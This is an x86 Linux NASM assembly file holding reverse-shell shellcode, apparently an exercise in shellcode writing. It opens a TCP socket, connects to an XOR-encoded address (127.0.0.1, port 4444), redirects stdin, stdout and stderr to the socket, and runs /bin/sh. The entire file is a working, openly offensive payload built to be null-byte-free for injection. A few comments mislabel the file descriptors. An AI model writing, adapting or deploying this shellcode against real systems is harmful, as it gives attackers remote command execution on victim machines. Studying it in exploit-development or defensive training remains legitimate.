; shell_reverse_tcp.nasm
; Author: Michael Norris

global _start

section .text
_start:
    ; clear registers
    xor edx, edx
    xor ecx, ecx
    xor ebx, ebx
    xor eax, eax

    ; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push edx            ; 0
    push 0x1            ; 1 = SOCK_STREAM
    push 0x2            ; 2 = AF_INET
    mov ecx, esp        ; *args
    inc bl              ; 1 = sys_socket
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int sockfd in eax
    
    ; Store int sockfd in ebx;
    mov ebx, eax
    
    ; const char* ip = "127.0.0.1";
    mov edi, 0xffffffff ; 255.255.255.255
    mov ecx, 0xfeffff80 ; 128.255.255.254
    xor ecx, edi        ; 0x0100007f = 127.0.0.1

    ; struct sockaddr_in addr;
    push ecx            ; inet_aton("127.0.0.1", &addr.sin_addr);
    push word 0x5c11    ; addr.sin_port = htons(4444);
    push word 0x2       ; addr.sin_family = 2 = AF_INET;
    mov ecx, esp        ; pointer to struct sockaddr_in addr;

    ; connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    push 0x10           ; 16 = sizeof(addr)
    push ecx            ; (struct sockaddr *)&addr
    push ebx            ; sockfd
    mov ecx, esp        ; *args
    mov al, 0x66        ; socketcall   
    int 0x80            ; returns 0 in eax

    ; int dup2(int oldfd, int newfd);
    mov ecx, edx        ; 0 = STDOUT
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 1 = STDIN
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 2 = STDERROR
    mov al, 0x3f        ; dup2
    int 0x80

    ; execve("/bin/sh", NULL, NULL);
    push edx            ; delimiting NULL for pathname; EDX is NULL for envp[]
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ecx, edx        ; NULL for argv[]
    mov ebx, esp        ; pointer to pathname
    mov al, 0xb         ; execve
    int 0x80
